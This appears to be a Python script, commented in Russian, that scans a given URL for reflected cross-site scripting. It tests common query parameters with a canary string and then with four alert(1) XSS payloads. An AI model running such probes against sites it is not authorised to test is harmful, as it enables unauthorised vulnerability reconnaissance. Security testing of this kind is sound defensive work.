import requests
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse
import html
import random
import string

# Сокращенный список для быстрого теста, полный можно оставить
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\" onfocus=alert(1) autofocus=",
    "javascript:alert(1)",
    "'><img src=x onerror=alert(1)>"
]

# Параметры, которые чаще всего уязвимы
PARAMS = ["q", "query", "search", "id", "p", "page", "callback", "url"]

def get_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def scan_xss_basic(url: str):
    results = []
    
    # 1. Сначала проверим, жив ли сайт
    try:
        initial_check = requests.get(url, timeout=5)
        if initial_check.status_code in [403, 404]:
            print(f"⚠️ Site returned {initial_check.status_code} initially. Scanning might fail.")
    except:
        return [{"error": "Site unreachable", "suspicious": False}]

    # Определяем разделитель для параметров (? или &)
    sep = "&" if "?" in url else "?"

    for param in PARAMS:
        # 2. "Канарейка": Проверяем, отражается ли параметр вообще
        # Не бьем сразу атакой, чтобы не получить бан
        canary = get_random_string()
        probe_url = f"{url}{sep}{param}={canary}"
        
        try:
            resp = requests.get(probe_url, timeout=5)
            
            # Если нашей случайной строки нет в ответе, нет смысла атаковать этот параметр
            if canary not in resp.text:
                continue 
                
            # А вот если отразилась — тогда атакуем!
            print(f"🔎 Param '{param}' reflects input. Testing payloads...")

            for payload in XSS_PAYLOADS:
                # Формируем атаку
                attack_url = f"{url}{sep}{param}={payload}"
                resp_attack = requests.get(attack_url, timeout=5)

                reflected = payload in resp_attack.text

                if reflected:
                    results.append({
                        "param": param,
                        "payload": payload,
                        "url": attack_url,
                        "suspicious": True,
                        "type": "Reflected XSS"
                    })
                    # Нашли одну дыру в этом параметре — хватит его мучить, идем к следующему
                    break 

        except requests.RequestException as e:
            print(f"❌ Connection error on param {param}: {e}")
            # Не добавляем как 'чисто', просто пропускаем

    return results

def scan_xss(url: str) -> bool:
    print(f"🔍 Starting Smart XSS scan: {url}")
    results = scan_xss_basic(url)
    
    # Если results пустой, но ошибок не было - значит чисто
    # Если были ошибки connection - они просто скипнулись в коде выше
    
    suspicious = [r for r in results if r.get("suspicious")]
    
    if suspicious:
        print(f"🚨 XSS FOUND: {len(suspicious)} vectors!")
        for r in suspicious:
            print(f"  → Vuln Param: {r['param']} | Payload: {r['payload']}")
        return True
    
    if not results:
        print("🟢 No reflections found (Clean)")
    
    return False
